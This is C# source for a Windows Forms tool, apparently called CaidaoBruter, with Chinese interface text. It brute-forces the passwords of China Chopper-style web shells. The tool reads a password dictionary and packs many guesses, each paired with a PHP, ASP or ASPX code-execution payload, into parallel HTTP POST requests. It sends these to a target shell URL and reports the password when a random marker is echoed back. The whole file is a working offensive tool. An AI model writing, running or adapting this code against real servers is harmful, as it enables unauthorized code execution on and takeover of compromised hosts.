using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net.Http;
using System.Security.Cryptography;

namespace CaidaoBruter
{
    public partial class Form1 : Form
    {
        readonly int bufferCount;
        ParallelOptions options;
        string dictFileName = null;
        bool isFound = false;

        volatile bool isStopped = false;

        string checkedString;
        string requestUri;
        dynamic lowestBreakIndex = null;
        long totalLines = 0;

        HttpClient httpClient;

        string language = null;
        Dictionary<string, string> testStr;

        // control for suspend/resume
        private static ManualResetEventSlim event_1 = new ManualResetEventSlim(true);

        public Form1()
        {
            InitializeComponent();

            // conf parallel options
            bufferCount = Environment.ProcessorCount * 4;
            options = new ParallelOptions();
            options.MaxDegreeOfParallelism = Environment.ProcessorCount;

            httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0");
            httpClient.Timeout = new TimeSpan(0, 0, 5);

            // 生成随机序列，用来做判断
            var rand = new Random();
            byte[] tmp = new byte[10];
            rand.NextBytes(tmp);
            using (var md5Hash = MD5.Create())
            {
                checkedString = FormHelper.GetMd5Hash(md5Hash, tmp.ToString());
                checkedString = FormHelper.GetMd5Hash(md5Hash, checkedString + tmp.ToString());
            }

            // 初始化测试用的字符串
            testStr = new Dictionary<string, string>(4);
            testStr.Add("PHP", string.Format("=print({0});&", checkedString));
            testStr.Add("ASP", string.Format("=response.write(\"{0}\");&", checkedString));
            testStr.Add("ASPX", string.Format("=Response.Write(\"{0}\");Response.End()", checkedString));
        }

        private void reset(int processBarValue, bool trueResetflag)
        {
            startButton.Enabled = true;
            pauseButton.Text = "Pause";
            pauseButton.Enabled = stopButton.Enabled = false;
            lowestBreakIndex = 0;
            progressBar1.Value = processBarValue;
            if (trueResetflag)
            {
                isFound = false;
                isStopped = false;
            }
        }

        private async void fileButton_Click(object sender, EventArgs e)
        {
            // 选择文件对话框
            using (var fileDialog = new OpenFileDialog())
            {
                fileDialog.Filter = "文本文件(*.txt)|*.txt|所有文件(*.*)|*.*";
                fileDialog.InitialDirectory = Environment.CurrentDirectory;
                if (fileDialog.ShowDialog() == DialogResult.OK)
                {
                    this.reset(0, true);
                    dictFileName = fileDialog.FileName;
                    if (dictFileName.Length > 45)
                    {
                        fileLabel.Text = dictFileName.Substring(0, 20) + "..." + dictFileName.Substring(dictFileName.Length - 25);
                    }
                    else fileLabel.Text = dictFileName;

                    // 统计行数
                    if (File.Exists(dictFileName))
                    {
                        int count = 0;
                        totalLabel.Text = "数量统计中...";

                        await Task.Run(() =>
                        {

                            using (StreamReader sr = new StreamReader(dictFileName))
                            {
                                while ((sr.ReadLine()) != null)
                                {
                                    ++count;
                                }
                            }
                        });
                        totalLines = count;
                        totalLabel.Text = string.Format("{0}", count);
                    }
                }
            }
        }

        private async void pauseButton_Click(object sender, EventArgs e)
        {
            if (pauseButton.Text == "Pause")
            {
                pauseButton.Text = "Pausing..";
                event_1.Reset();
                await Task.Delay(500);
                pauseButton.Text = "Resume";
            }
            else
            {
                pauseButton.Text = "Resuming";
                event_1.Set();
                await Task.Delay(500);
                pauseButton.Text = "Pause";
            }

        }
        private void stopButton_Click(object sender, EventArgs e)
        {
            isStopped = true;
            this.stopButton.Enabled = false;
            this.stopButton.Text = "stoping..";

            if (pauseButton.Text == "Resume") event_1.Set();
        }
        private async void start_Click(object sender, EventArgs e)
        {
            /* 
             * || 
                this.GetCheckedRadioButton(confGroup.Controls) == null ||
                (this.GetCheckedOption(charsGroup.Controls) == null && dictFileName == null)
                */
            if (shellBox.Text == "" || dictFileName == null || (language = FormHelper.GetCheckedRadioButton(confGroup.Controls)) == null)
            {
                MessageBox.Show("请检查是否配置是否正确.", "错误信息");
            }
            else
            {
                FormHelper.ControlInvokeSafe(startButton, () =>
                {
                    startButton.Enabled = false;
                    stopButton.Enabled = true;
                    pauseButton.Enabled = true;
                    requestUri = shellBox.Text.ToString().Trim();
                });
                if (dictFileName != null)
                {
                    // 利用processHandler控制processBar的进度
                    var processHandler = new Progress<int>((value) =>
                    {
                        progressBar1.Value = value;
                    });
                    await Task.Run(() =>
                    {
                        ExploitByDict(processHandler as IProgress<int>);
                    });
                }
            }
        }
        //brute via dictory 
        private void ExploitByDict(IProgress<int> processHandler)
        {
            using (StreamReader sr = new StreamReader(dictFileName))
            {
                int i = 0, j = 0;
                double currLinesCount = 0.0;
                double preLinesCount = 0.0;
                int linesToRead = (int)parallelCount.Value;
                string[] curLines = new string[linesToRead];

                while (!sr.EndOfStream)
                {
                    event_1.Wait();
                    List<string> stringList = new List<string>();
                    for (i = 0; i < bufferCount && !sr.EndOfStream; ++i)
                    {
                        for (j = 0; j < linesToRead; ++j)
                        {
                            var curLine = sr.ReadLine();
                            if (curLine == null) break;
                            curLines[j] = curLine;
                            ++currLinesCount;
                        }
                        stringList.Add(string.Join(testStr[language], curLines) + testStr[language].Substring(0, testStr[language].Length - 1));
                        FormHelper.ControlInvokeSafe(curLabel, () => { curLabel.Text = curLines[0]; });

                    }
                    preLinesCount = currLinesCount;
                    processHandler.Report((int)(currLinesCount / totalLines * 100));
                    try
                    {
                        var result = Parallel.ForEach(stringList, options, (s, loopstate) =>
                        {
                            if (isStopped) loopstate.Stop();
                            else
                            {
                                var res = httpClient.PostAsync(requestUri, new StringContent(s, Encoding.UTF8, "application/x-www-form-urlencoded")).Result.Content.ReadAsStringAsync().Result;
                                if (res.Contains(checkedString))
                                {
                                    loopstate.Stop();
                                    isFound = true;
                                    this.CheckAgain(s);
                                }

                            };
                        });
                        if (result.LowestBreakIteration == null && result.IsCompleted == false)
                        {
                            FormHelper.ControlInvokeSafe(stopButton, () =>
                            {
                                stopButton.Text = "Stop";
                                this.reset(100, false);
                                isStopped = false;
                            });
                            break;
                        }
                    }
                    catch
                    {
                        MessageBox.Show("发送请求失败，请检查网络连接!");
                        FormHelper.ControlInvokeSafe(stopButton, () =>
                        {
                            this.reset(0, false);
                        });
                        break;
                    }
                }
                if (sr.EndOfStream && !isFound)
                {
                    MessageBox.Show("破解失败，请尝试用更复杂的字典或字符集", "失败了");
                    FormHelper.ControlInvokeSafe(startButton, () => this.reset(100, true));
                }

            }

        }

        private void CheckAgain(string s)
        {
            string[] stringList = s.Split('&');
            Parallel.ForEach(stringList, options, (x, loopState) =>
            {
                var resp = httpClient.PostAsync(requestUri, new StringContent(x, Encoding.UTF8, "application/x-www-form-urlencoded")).Result.Content.ReadAsStringAsync().Result;
                if (resp.Contains(checkedString))
                {

                    MessageBox.Show(string.Format("找到了! 密码是 {0}", x.Split('=')[0]));
                    loopState.Stop();
                }
            });
        }

        private void shellBox_Leave(object sender, EventArgs e)
        {
            if (this.shellBox.Text != "" && !this.shellBox.Text.StartsWith("http"))
            {
                this.shellBox.Text = "http://" + this.shellBox.Text;
            }
        }
    }
}
